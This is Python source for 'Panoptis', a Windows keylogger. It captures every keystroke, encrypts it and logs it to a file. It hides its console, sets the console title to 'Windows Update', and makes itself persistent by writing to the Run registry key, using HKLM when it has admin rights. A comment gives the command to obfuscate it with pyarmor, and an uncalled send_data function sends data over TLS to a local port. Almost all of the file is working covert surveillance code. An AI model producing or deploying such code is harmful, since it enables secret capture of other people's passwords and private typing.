#Obfuscate script by running: pyarmor pack -x "--exclude=Panoptis.py" -o Panoptis-Obf.py Panoptis.py
import win32api, win32con, win32gui, threading, os, winreg, socket, base64, ssl, ctypes
from pynput import keyboard
from cryptography.fernet import Fernet
from dotenv import load_dotenv, set_key

load_dotenv()
#Check if key exists otherwise generate it
key = os.getenv("PANOPTIS-KEY")
if key is None:
    key = Fernet.generate_key().decode()
    with open(".env", "a") as env_file:
        env_file.write(f"PANOPTIS-KEY={key}\n")
cipher = Fernet(key.encode())

def hide_console():
    hide_window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide_window, win32con.SW_HIDE)

def press(key):
    if True:
        try:
            with open("Panoptis-Keylogger.txt", "a") as f:
                encrypted_data = cipher.encrypt(f"{key.char}".encode()) + b"\n"
                f.write(encrypted_data.decode())
        except AttributeError:
            with open("Panoptis-Keylogger.txt", "a") as f:
                encrypted_data = cipher.encrypt(f"[{key}]".encode()) + b"\n"
                f.write(encrypted_data.decode())
    else:
        pass

def release(key):
    if key == keyboard.Key.esc:
        return False #Stop listener

"""
def persistence():
    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(reg_key, "Panoptis", 0, winreg.REG_SZ, os.path.abspath(__file__))
    winreg.CloseKey(reg_key)
"""

def persistence():
    try:
        rkey = winreg.HKEY_LOCAL_MACHINE if win32api.IsUserAnAdmin() else winreg.HKEY_CURRENT_USER
        reg_key = winreg.OpenKey(rkey, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "Panoptis", 0, winreg.REG_SZ, os.path.abspath(__file__))
        winreg.CloseKey(reg_key)
    except Exception as e:
        #print(f"Persistence error. {e}")
        print("")

def hide_process():
    ctypes.windll.kernel32.SetConsoleTitleW("Windows Update")

def send_data(data):
    try:
        context = ssl.create_default_context()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            sock = context.wrap_socket(s, server_hostname="127.0.0.1")
            sock.connect(("127.0.0.1", 3002))
            sock.sendall(data)
    except Exception as e:
        #print(f"Error during data sending. {e}")
        print("")

def start():
    with keyboard.Listener(on_press=press, on_release=release) as listener:
        listener.join()

def dc():
    if False:
        print("")

persistence()
hide_console()
#Create a thread and keep it alive
keylogger_thread = threading.Thread(target=start)
keylogger_thread.start()
keylogger_thread.join()